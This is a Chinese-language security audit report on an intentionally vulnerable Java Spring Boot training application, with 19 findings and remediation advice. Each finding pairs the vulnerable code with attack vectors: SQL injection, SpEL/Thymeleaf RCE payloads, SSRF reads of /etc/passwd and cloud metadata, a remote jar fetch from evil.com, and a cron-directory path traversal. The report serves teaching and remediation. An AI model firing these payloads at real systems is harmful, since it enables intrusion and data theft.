# JVWA 安全代码审计报告

> 项目：Java Vulnerable Web Application (JVWA)
> 框架：Spring Boot + MyBatis + Thymeleaf
> 审计范围：`src/main/java/com/ffffffff0x/exploit/`

---

## 漏洞汇总

| 编号 | 漏洞类型 | 危险等级 | 文件位置 |
|------|----------|----------|----------|
| VUL-01 | SQL 注入（MyBatis `${}`） | 严重 | SQLinj.java / UserMapper.xml |
| VUL-02 | SSTI（Thymeleaf 预处理表达式） | 严重 | SSTI.java / ssti.html |
| VUL-03 | SSTI（视图名称可控） | 严重 | SSTI.java |
| VUL-04 | SpEL 注入（StandardEvaluationContext） | 严重 | SpEL.java |
| VUL-05 | SSRF（无过滤，支持任意协议） | 高危 | SSRF.java / Http.java |
| VUL-06 | SSRF（重定向绕过内网检测） | 高危 | SSRF.java / Http.java |
| VUL-07 | 任意文件上传（无过滤） | 高危 | Upload.java |
| VUL-08 | 文件上传黑名单绕过 | 高危 | Upload.java |
| VUL-09 | 文件上传路径穿越 | 高危 | Upload.java |
| VUL-10 | 开放重定向（无过滤） | 中危 | Redirect.java |
| VUL-11 | 开放重定向（白名单绕过-包含检测） | 中危 | Redirect.java |
| VUL-12 | 开放重定向（白名单绕过-反斜杠） | 中危 | Redirect.java |
| VUL-13 | SQL 关键词过滤函数失效 | 中危 | Security.java |
| VUL-14 | Spring Actuator 全端点暴露 | 中危 | application-dev.properties |
| VUL-15 | Druid 监控控制台弱口令 | 中危 | application-dev.properties |
| VUL-16 | 数据库凭据硬编码 | 中危 | application-dev.properties |
| VUL-17 | 云凭据信息泄露 | 中危 | InfoLeak.java / aksk.html |
| VUL-18 | IP 伪造（信任 X-Forwarded-For） | 低危 | IPInfo.java |
| VUL-19 | Swagger UI XSS | 低危 | application-dev.properties |

---

## 详细分析

---

### VUL-01：SQL 注入（MyBatis `${}` 拼接）

**危险等级**：严重
**漏洞文件**：
- `src/main/java/com/ffffffff0x/exploit/SQLinj.java`（第 31-43 行）
- `src/main/java/com/ffffffff0x/exploit/p/mapper/UserMapperPrimary.java`（第 19 行）
- `src/main/resources/mapper.primary/UserMapper.xml`（第 13 行）
- `src/main/resources/mapper.secondary/UserMapper.xml`（第 13 行）

**漏洞代码**：

```java
// SQLinj.java:31-35
@GetMapping("/mysql/getbyid/{id}")
public List<UserPrimary> getById(@PathVariable String id) {
    log.info("输入的查询payload: "+id);
    return userMapperPrimary.findById(id);
}
```

```java
// UserMapperPrimary.java:19
@Select("select * from user_info where id = ${id}")
List<UserPrimary> findById(@Param("id") String id);
```

```xml
<!-- UserMapper.xml:13 -->
<select id="findById" resultType="...">
    select * from USER where id = ${id}
</select>
```

**漏洞分析**：
MyBatis 中 `${}` 为字符串直接拼接，不进行参数化处理，导致 SQL 注入。而 `#{}` 才是参数化预处理方式。

**攻击向量**：
```
GET /sqlinj/mysql/getbyid/1 or 1=1
GET /sqlinj/mysql/getbyidp/id?id=1 and (select if(mid(user(),1,4)='root',sleep(1),123))
GET /sqlinj/postgre/getbyid/1 or 1=1
```

**修复建议**：将 `${id}` 改为 `#{id}` 使用参数化查询。

---

### VUL-02：SSTI - Thymeleaf 预处理表达式注入

**危险等级**：严重（可 RCE）
**漏洞文件**：
- `src/main/java/com/ffffffff0x/exploit/SSTI.java`（第 31-35 行）
- `src/main/resources/templates/ssti.html`（第 4 行）

**漏洞代码**：

```java
// SSTI.java:31-35
@GetMapping("/1")
public String vul(@RequestParam(name="name") String name, @RequestParam(name="name2") String name2, Model model) {
    model.addAttribute("name", name);
    model.addAttribute("name2", name2);
    return "ssti";
}
```

```html
<!-- ssti.html:4 -->
<h1 th:href="@{__${name}__}">name1参数</h1>
```

**漏洞分析**：
Thymeleaf 模板中使用了预处理语法 `__${...}__`，该语法会在正常表达式求值之前对内层表达式再进行一次解析。当 `name` 参数中包含 SpEL 表达式时，Thymeleaf 会执行其中的 Java 代码，导致 RCE。

**攻击向量**：
```
GET /ssti/1?name=${T(java.lang.Runtime).getRuntime().exec("id")}&name2=1
```

**修复建议**：避免在模板属性中使用 `__${变量}__` 预处理语法，改用 `th:text="${name}"` 等安全方式。

---

### VUL-03：SSTI - 视图名称（View Name）可控

**危险等级**：严重（可 RCE）
**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/SSTI.java`（第 41-43 行）

**漏洞代码**：

```java
// SSTI.java:41-43
@GetMapping("/2")
public String path(@RequestParam String name) {
    return "user/" + name + "/welcome"; // template path is tainted
}
```

**漏洞分析**：
控制器将用户输入直接拼接到模板路径中返回。当 Thymeleaf 解析该视图名称时，其中的 SpEL 表达式会被求值执行，导致 RCE。

**攻击向量**：
```
GET /ssti/2?name=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

**修复建议**：避免将用户输入直接拼接到视图名称返回值中；应使用白名单对 `name` 参数进行严格校验。

---

### VUL-04：SpEL 注入（StandardEvaluationContext）

**危险等级**：严重（可 RCE）
**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/SpEL.java`（第 27-47 行）

**漏洞代码**：

```java
@GetMapping("/spel")
public String vul1(String exec) {
    ExpressionParser parser = new SpelExpressionParser();
    // StandardEvaluationContext 拥有完整权限，可执行任意代码
    EvaluationContext evaluationContext = new StandardEvaluationContext();
    String result = parser.parseExpression(exec).getValue(evaluationContext).toString();
    return result;
}
```

**漏洞分析**：
用户输入 `exec` 参数被直接传入 `SpelExpressionParser` 解析并在 `StandardEvaluationContext` 下执行。`StandardEvaluationContext` 不限制可调用的类和方法，攻击者可通过 `T()` 运算符调用任意 Java 类。

**攻击向量**：
```
GET /spel?exec=T(java.lang.Runtime).getRuntime().exec("id")
GET /spel?exec=T(java.lang.ProcessBuilder).new(new String[]{"/bin/bash","-c","whoami"}).start()
```

**修复建议**：改用 `SimpleEvaluationContext`，它限制了可访问的类型和方法，且不允许调用 `T()` 运算符；或禁止用户直接输入 SpEL 表达式。

---

### VUL-05：SSRF - 无过滤（任意协议）

**危险等级**：高危
**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/SSRF.java`（第 28-32 行）

**漏洞代码**：

```java
@GetMapping("/1")
public String vul1(String url) {
    log.info("访问路径：" + url);
    return Http.URLConnection(url);  // 无任何过滤
}
```

**漏洞分析**：
`URLConnection` 类支持多种协议（`http://`、`https://`、`file://`、`jar://`、`ftp://` 等），未经任何过滤直接传入，攻击者可利用 `file://` 读取服务器本地文件，或利用 `jar://` 进行进一步攻击。

**攻击向量**：
```
GET /ssrf/1?url=file:///etc/passwd
GET /ssrf/1?url=file:///etc/shadow
GET /ssrf/1?url=http://169.254.169.254/latest/meta-data/   （云服务器元数据）
GET /ssrf/1?url=jar:http://evil.com/malicious.jar!/
```

**修复建议**：使用协议白名单（仅允许 `http://` 和 `https://`）；禁止访问内网 IP 段；使用 `HttpURLConnection` 替代 `URLConnection`。

---

### VUL-06：SSRF - 重定向绕过内网检测

**危险等级**：高危
**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/SSRF.java`（第 39-69 行）+ `src/main/java/com/ffffffff0x/exploit/util/Http.java`（URLConnection2 方法）

**漏洞代码**：

```java
// SSRF.java - vul2 对URL进行解析后检查IP，但URLConnection2 会跟随重定向
@GetMapping("/2")
public String vul2(String url) {
    // 1. 解析 URL → 获取 host → DNS 解析 → 检查 IP
    InetAddress ip = InetAddress.getByName(host);
    if (Security.isIntranet(ip3)) { return "不允许访问内网!!!"; }
    // 2. 实际请求时再次 DNS 解析（DNS Rebinding 窗口）
    return Http.URLConnection2(url);
}

// Http.java - URLConnection2 跟随重定向但不重新检查目标IP
if (redirect) {
    String newUrl = connection.getHeaderField("Location");
    URL u1 = new URL(newUrl);
    conn = u1.openConnection();  // 直接访问重定向地址，未再检查
}
```

**漏洞分析**：
1. **DNS Rebinding**：第一次检查时 DNS 解析为外网 IP，第二次实际请求时 DNS 解析为内网 IP，绕过检测。
2. **URL 短链重定向绕过**：使用短链服务将外网 URL 重定向到 `file:///etc/passwd` 或内网地址，`URLConnection2` 会跟随重定向但不重新检查。

**攻击向量**：
```
GET /ssrf/2?url=https://short.link/xxxx   （短链指向 file:///etc/passwd）
```

**修复建议**：禁止跟随重定向（`setInstanceFollowRedirects(false)`）；在实际请求时同样进行内网 IP 校验；使用 TTL=0 的 DNS 结果缓存。

---

### VUL-07：任意文件上传（无过滤）

**危险等级**：高危
**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/Upload.java`（第 34-48 行）

**漏洞代码**：

```java
@PostMapping("/upload")
@ResponseBody
public String vul1(@RequestPart MultipartFile file) throws IOException {
    String fileName = file.getOriginalFilename();  // 直接使用原始文件名
    String filePath = path + fileName;
    File dest = new File(filePath);
    Files.copy(file.getInputStream(), dest.toPath());
    return "文件上传成功 : " + dest.getAbsolutePath();
}
```

**漏洞分析**：
- 不对文件类型（MIME Type）和扩展名做任何校验
- 直接使用客户端提供的原始文件名（可包含 `../` 路径穿越）
- 攻击者可直接上传 `.jsp` WebShell

**攻击向量**：
```http
POST /upload
Content-Type: multipart/form-data

file=@webshell.jsp
```

**修复建议**：使用白名单校验文件扩展名；校验 MIME Type；随机化文件名；将上传目录设置在 Web 根目录之外。

---

### VUL-08：文件上传黑名单绕过

**危险等级**：高危
**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/Upload.java`（第 51-80 行）

**漏洞代码**：

```java
@PostMapping("/upload2")
@ResponseBody
public String vul2(@RequestPart MultipartFile file) throws IOException {
    List<String> suffixlist = List.of(".jsp", ".jspx");  // 仅黑名单两种扩展名
    String suffix = fileName.substring(fileName.lastIndexOf("."));
    String suffixLower = suffix.toLowerCase();
    if (suffixlist.contains(suffixLower)) {
        return "非法请求，请上传文档文件";
    }
    // ...上传文件
}
```

**漏洞分析**：
黑名单仅阻止 `.jsp` 和 `.jspx`，可通过以下方式绕过：
- 使用其他 JSP 变体扩展名：`.jspf`、`.jspa`、`.jspx`（大小写）、`.JSP`
- Tomcat 特定扩展名（视服务器配置而定）
- 上传其他类型的恶意文件（如 `*.xml` 包含 XXE）

**攻击向量**：
```http
POST /upload2

file=@webshell.jspf
```

**修复建议**：改用白名单（仅允许安全的文件扩展名），而非黑名单。

---

### VUL-09：文件上传路径穿越

**危险等级**：高危
**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/Upload.java`（第 84-108 行）

**漏洞代码**：

```java
@PostMapping("/upload3")
@ResponseBody
public String vul3(@RequestPart MultipartFile file) throws IOException {
    String fileName = file.getOriginalFilename();  // 未做路径穿越检测
    String filePath = path + fileName;             // path = "/tmp/"
    if (!".xlsx".equals(suffix) && !".xls".equals(suffix)) {
        return "非法请求";
    }
    File dest = new File(filePath);
    Files.copy(file.getInputStream(), dest.toPath());
}
```

**漏洞分析**：
虽然有白名单扩展名检测，但 `getOriginalFilename()` 返回的文件名可以包含 `../` 路径穿越序列。`fileName.lastIndexOf(".")` 取到的是最后一个 `.`，因此文件名 `../../etc/cron.d/evil.xls` 通过了扩展名检查，却实际写入 `/etc/cron.d/evil.xls`。

**攻击向量**：
```
filename: ../../etc/cron.d/reverse_shell.xls
```

**修复建议**：上传前对文件名调用 `Paths.get(fileName).getFileName().toString()` 去除路径前缀，或检测 `fileName.contains("..")` 和 `fileName.contains("/")`。

---

### VUL-10：开放重定向（无过滤）

**危险等级**：中危
**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/Redirect.java`（第 23-26 行）

**漏洞代码**：

```java
@GetMapping("/1")
public String vul(String url) {
    log.info(url);
    return "redirect:" + url;  // 直接拼接，无任何过滤
}
```

**漏洞分析**：
`url` 参数完全由用户控制，可跳转至任意 URL，常用于钓鱼攻击。

**攻击向量**：
```
GET /redirect/1?url=https://evil.com/phishing-page
```

---

### VUL-11：开放重定向（白名单绕过 - 字符串包含检测）

**危险等级**：中危
**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/Redirect.java`（第 31-41 行）

**漏洞代码**：

```java
@GetMapping("/2")
public String vul2(String url) {
    String domain = "ffffffff0x.com";
    int result = url.indexOf(domain);  // 只要 URL 中包含该字符串即可通过
    if(result != -1){
        return "redirect:" + url;
    }
    ...
}
```

**漏洞分析**：
`indexOf` 仅检查目标字符串是否存在于 URL 中，攻击者只需将 `ffffffff0x.com` 作为路径或参数放入恶意 URL 即可绕过。

**攻击向量**：
```
GET /redirect/2?url=http://evil.com/ffffffff0x.com
GET /redirect/2?url=http://evil.com/?x=ffffffff0x.com
```

---

### VUL-12：开放重定向（白名单绕过 - 反斜杠）

**危险等级**：中危
**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/Redirect.java`（第 44-61 行）

**漏洞代码**：

```java
@GetMapping("/3")
public String vul3(String url) {
    host = new URL(url).getHost();  // Java URL 类对反斜杠 %5C 的解析行为
    if (host.endsWith(".ffffffff0x.com")){
        return "redirect:https://" + host;
    }
}
```

**漏洞分析**：
Java 的 `URL.getHost()` 对某些浏览器（Chrome/IE）会将 `%5C`（`\`）解析为路径分隔符，导致 `host` 被解析为 `www.baidu.com` 而浏览器实际跳转到 `www.ffffffff0x.com`。

**攻击向量**：
```
GET /redirect/3?url=http://www.baidu.com%5Cwww.ffffffff0x.com
```

---

### VUL-13：SQL 过滤函数（checkSql）完全失效

**危险等级**：中危
**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/util/Security.java`（第 69-78 行）

**漏洞代码**：

```java
public static boolean checkSql(String content) {
    String black = "'|;|--|+|,|%|=|>|<|*|(|)|and|or|exec|...";
    String[] black_list = black.split("|");  // BUG: | 是正则元字符，split("|") 等于每个字符分割
    for (int i = 0; i < black_list.length; i++) {
        if (content.contains(black_list[i])) {
            return true;
        }
    }
    return false;
}
```

**漏洞分析**：
`String.split("|")` 中 `|` 是正则表达式的 OR 操作符，相当于 `split("")`，会将字符串拆分成每个字符的数组（`["'", "|", ";", "|", ...]`），导致黑名单中大多数关键字无法正确匹配，该过滤函数形同虚设。

**修复建议**：改用 `black.split("\\|")` 转义管道符，或使用 `Pattern.quote("|")`。

---

### VUL-14：Spring Actuator 全端点暴露

**危险等级**：中危
**漏洞文件**：`src/main/resources/application-dev.properties`（第 61-62 行）

**漏洞配置**：

```properties
management.endpoints.web.exposure.include=*
management.endpoints.jmx.exposure.include=*
```

**漏洞分析**：
暴露全部 Actuator 端点，攻击者可访问：
- `/actuator/env`：获取所有环境变量（包括数据库密码等敏感配置）
- `/actuator/heapdump`：下载 JVM 堆转储，可能包含内存中的敏感数据
- `/actuator/threaddump`：线程信息
- `/actuator/loggers`：可修改日志级别
- 结合 Spring Cloud 场景还可能导致 RCE

**修复建议**：只暴露必要的端点，例如 `management.endpoints.web.exposure.include=health,info`，并配置认证。

---

### VUL-15：Druid 监控控制台弱口令

**危险等级**：中危
**漏洞文件**：`src/main/resources/application-dev.properties`（第 54-59 行）

**漏洞配置**：

```properties
spring.datasource.druid.stat-view-servlet.enabled=true
spring.datasource.druid.stat-view-servlet.url-pattern=/druid/*
spring.datasource.druid.stat-view-servlet.login-username=admin
spring.datasource.druid.stat-view-servlet.login-password=admin
spring.datasource.druid.stat-view-servlet.allow=   # 空 = 允许所有IP访问
```

**漏洞分析**：
Druid 监控控制台使用默认弱口令 `admin/admin`，且 `allow` 为空允许所有 IP 访问。攻击者可登录查看所有 SQL 语句执行记录、数据源配置（含密码）。

---

### VUL-16：数据库凭据硬编码

**危险等级**：中危
**漏洞文件**：`src/main/resources/application-dev.properties`（第 21-29 行）

**漏洞配置**：

```properties
spring.datasource.druid.primary.jdbc-url=jdbc:mysql://10.211.55.3:3306/test
spring.datasource.druid.primary.username=root
spring.datasource.druid.primary.password=ffffffff0x

spring.datasource.druid.secondary.jdbc-url=jdbc:postgresql://10.211.55.3:5432/test
spring.datasource.druid.secondary.username=postgres
spring.datasource.druid.secondary.password=ffffffff0x
```

**漏洞分析**：
数据库凭据（包括 root 权限账户）以明文形式硬编码在配置文件中，一旦代码仓库泄露，攻击者即可直接连接数据库。

**修复建议**：使用环境变量、Vault 等密钥管理服务，或 Spring 的加密配置功能。

---

### VUL-17：云凭据信息泄露（AK/SK）

**危险等级**：中危
**漏洞文件**：
- `src/main/java/com/ffffffff0x/exploit/InfoLeak.java`
- `src/main/resources/templates/aksk.html`

**漏洞代码**：

```html
<!-- aksk.html -->
SecretId : AKIDf9NL2Rxx1LNxxqmSr0sxxoZ3XXXGNDxx
SecretKey : GI3XkgMlsiIabLxxvZw3sxxhQx6XXXxx
AccessKey ID : LTAI5XLxTxxxxdcTXXExxxxx
AWS Access Key ID: AKIAUXXXXXFYXNIXXXXX
```

**漏洞分析**：
`/infoleak/aksk` 页面暴露了腾讯云、阿里云、AWS 的 AK/SK 凭据，任意用户可直接访问。在真实场景下，AK/SK 泄露可导致云账号被接管、数据被窃取或产生大量费用。

---

### VUL-18：IP 伪造（信任客户端提供的 IP 头）

**危险等级**：低危
**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/IPInfo.java`（第 34-47 行）

**漏洞代码**：

```java
@GetMapping("/realIp")
public static String ip(HttpServletRequest request) {
    String ip1 = request.getRemoteAddr();
    String ip2 = request.getHeader("X-Real-IP");      // 可伪造
    String ip3 = request.getHeader("X-Forwarded-For"); // 可伪造
    if (ip1 != null) { return ip1; }
    else if (ip2 != null) { return ip2; }
    else { return ip3; }
}
```

**漏洞分析**：
逻辑错误：`ip1`（`getRemoteAddr()`）总是不为 null，因此该端点实际上总是返回 `ip1`。但 `/ipinfo/xxf` 端点直接读取并返回 `X-Forwarded-For` 等可伪造的头，若业务中基于此 IP 做授权（如 IP 白名单），攻击者可通过伪造请求头绕过。

---

### VUL-19：Swagger UI XSS

**危险等级**：低危
**漏洞文件**：`src/main/resources/application-dev.properties`（第 4-5 行注释）

**漏洞说明**：

```properties
# swagger-ui xss
# http://127.0.0.1:8999/swagger-ui.html?configUrl=https://jumpy-floor.surge.sh/test.json
```

**漏洞分析**：
旧版本 Swagger UI 的 `configUrl` 参数存在 XSS 漏洞，攻击者可以构造恶意 URL 诱使管理员点击，在浏览器中执行任意 JavaScript。

---

## 修复优先级建议

### 立即修复（严重/高危）

1. **VUL-01**：将 MyBatis 中所有 `${id}` 改为 `#{id}`
2. **VUL-02/03**：禁止用户输入影响 Thymeleaf 预处理表达式或视图名称
3. **VUL-04**：将 `StandardEvaluationContext` 改为 `SimpleEvaluationContext`，或完全禁止用户输入 SpEL
4. **VUL-05/06**：实现严格的 SSRF 防护（协议白名单 + 内网 IP 黑名单 + 禁止重定向）
5. **VUL-07/08/09**：文件上传改用扩展名白名单 + 随机文件名 + 路径穿越检测

### 尽快修复（中危）

6. **VUL-13**：修复 `checkSql` 中 `split("|")` 为 `split("\\|")`
7. **VUL-14**：限制 Actuator 端点暴露并添加认证
8. **VUL-15**：修改 Druid 默认口令，限制访问 IP
9. **VUL-16**：移除硬编码凭据，使用环境变量或密钥管理服务
10. **VUL-17**：移除或保护云凭据页面

---

*报告生成时间：2026-02-26*
